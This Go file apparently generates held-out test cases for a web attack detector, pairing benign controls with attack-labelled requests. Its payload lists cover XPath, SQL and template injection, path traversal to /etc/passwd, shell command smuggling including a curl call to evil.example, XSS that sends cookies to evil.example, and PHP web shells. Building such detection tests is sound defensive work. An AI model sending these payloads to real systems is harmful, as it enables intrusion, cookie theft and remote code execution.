// SPDX-License-Identifier: Apache-2.0

package main

import (
	"encoding/json"
	"fmt"
	"net/url"
)

// These are held-out syntax probes, added after the measured variants-v1 run.
// They exercise families rather than an exact payload string. The counted origin
// never evaluates code, performs a fetch or interprets a query.
func hardeningCases() []testCase {
	var out []testCase
	for i, body := range []string{`<input value="O'Brien"/>`, `<input>Hello<!--comment--> world</input>`, `<input><![CDATA[Hello world]]></input>`} {
		out = append(out, testCase{Name: fmt.Sprintf("xpath/defense-xml-control-%d", i),
			Request: request{Method: "POST", URI: "/api/loadtest/xpath", Headers: map[string]string{"Content-Type": "application/xml"}, Body: body}, Description: "ordinary XML attribute or fragmented text control"})
	}
	for i, body := range []string{
		"<input>' or tr<!--noise-->ue() or 'a'='b</input>",
		"<input>' or tr<![CDATA[ue()]]> or 'a'='b</input>",
		"<input value=\"' or true() or 'a'='b\"/>",
	} {
		out = append(out, testCase{Name: fmt.Sprintf("xpath/defense-xml-%d", i), Attack: true,
			Request: request{Method: "POST", URI: "/api/loadtest/xpath", Headers: map[string]string{"Content-Type": "application/xml"}, Body: body},
			Parent:  "xpath/adversarial-family", Variation: "XML scalar spelling", Description: "held-out XML syntax probe; application sink required"})
	}
	for _, family := range []struct {
		category string
		payloads []string
	}{
		{"xpath", []string{
			"' or ((true())) or 'a'='b", "' or (:comment:) true() or 'a'='b",
			"' or (:(:nested:)comment:) true() or 'a'='b",
			"' or (count(//account)>0) or 'a'='b",
			"' and (string-length(name())>0) and 'a'='a",
			"' or local-name(/*)='users' or 'a'='b",
			"']|//password|//*['a'='a",
		}},
		{"rce", []string{";${IFS}id", ";i${UNSET_VAR}d", ";/bin/i\"\"d", "$( /usr/bin/id )", "`who'am'i`",
			";cat$IFS/etc/passwd", "|/bin/cat /etc/passwd", "$(curl${IFS}evil.example)"}},
		{"ssti", []string{"{{ (7 * 7) }}", "${(7*7)}", "*{(8 + 8)}", "{{ config.items() }}",
			"{{''.__class__.__mro__}}", "{{request.application.__globals__}}"}},
		{"lfi", []string{"%25252e%25252e%25252fetc%25252fpasswd", "%2525252e%2525252e%2525252fetc%2525252fpasswd",
			"..%c0%af..%c0%afetc%c0%afpasswd", "php://filter/convert.base64-encode/resource=/etc/passwd",
			"....//....//....//etc/passwd", "/var/www/html/../../../../etc/passwd"}},
		{"sqli", []string{
			"1') OR ('1'='1'-- -", "1 UNION SELECT username,password FROM users-- -", "admin' OR '1'='1'-- -",
			"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
			"1 OR SLEEP(5)-- -", "1;SELECT pg_sleep(5)-- -", "1 /*!50000UNION*/ /*!50000SELECT*/ NULL-- -",
		}},
		{"xss", []string{
			"<script>document.location=`//evil.example/`+document.cookie</script>", "<img src=x onerror=prompt(document.domain)>",
			"\"><svg/onload=alert(document.domain)>", "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
			"<details open ontoggle=confirm(1)>",
		}},
		{"php", []string{
			"<?php echo shell_exec($_GET['c']); ?>", "<?= passthru('id') ?>",
			"<?php system(base64_decode('aWQ=')); ?>", "<?php eval($_POST['x']); ?>",
			"<?php file_get_contents('/etc/passwd'); ?>",
		}},
	} {
		for i, value := range family.payloads {
			path := "/api/loadtest/" + family.category
			body, _ := json.Marshal(map[string]string{"input": value})
			requests := []request{
				{Method: "GET", URI: path + "?input=" + url.QueryEscape(value)},
				{Method: "POST", URI: path, Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}, Body: "input=" + url.QueryEscape(value)},
				{Method: "POST", URI: path, Headers: map[string]string{"Content-Type": "application/json"}, Body: string(body)},
			}
			for channel, r := range requests {
				out = append(out, testCase{Name: fmt.Sprintf("%s/defense-%02d-%d", family.category, i, channel), Attack: true, Request: r,
					Parent: family.category + "/adversarial-family", Variation: fmt.Sprintf("syntax-%02d-channel-%d", i, channel), Description: "held-out syntax probe; application sink required"})
			}
		}
		for i, value := range []string{"ordinary sample", "O'Brien", "parentheses (are useful)", "7 * 7 = 49", "a percentage is 25%", "https://assets.example.test/public/photo.png"} {
			body, _ := json.Marshal(map[string]string{"input": value})
			out = append(out, testCase{Name: fmt.Sprintf("%s/defense-control-%02d", family.category, i), Request: request{Method: "POST", URI: "/api/loadtest/" + family.category, Headers: map[string]string{"Content-Type": "application/json"}, Body: string(body)}, Description: "ordinary nearby control"})
		}
	}
	return out
}
